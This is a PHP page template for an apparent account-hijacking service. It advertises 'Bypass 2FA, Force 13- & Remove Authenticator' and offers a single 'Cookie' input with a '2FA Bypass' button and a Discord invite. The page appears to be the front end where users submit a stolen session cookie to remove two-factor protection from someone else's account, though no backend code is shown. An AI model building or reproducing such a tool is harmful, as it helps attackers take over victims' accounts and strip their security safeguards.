<?php
require("include.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$setup["SiteName"];?> - Create</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf/notyf.min.css">
    <script src="https://cdn.jsdelivr.net/npm/notyf/notyf.min.js"></script>
    <link rel="stylesheet" href="/css/main.css?where">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        .form input {
            display: block;
            margin: 10px 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><?=$setup["SiteName"];?></div>
        <p class="description">
            Bypass 2FA, Force 13- & Remove Authenticator.
        </p>
        <div class="form">
            <div id="regular-form" class="form-section">
                <input type="text" placeholder="Cookie" id="cookie">
                <button id="create-site" class="create-btn"><i class="fas fa-link"></i> 2FA Bypass</button>
            </div>
        </div>
        <div class="footer">
            <p>Want to explore more? <a href="<?=$setup['Discord'];?>">Join our Discord</a></p>
        </div>
    </div>
</body>
</html>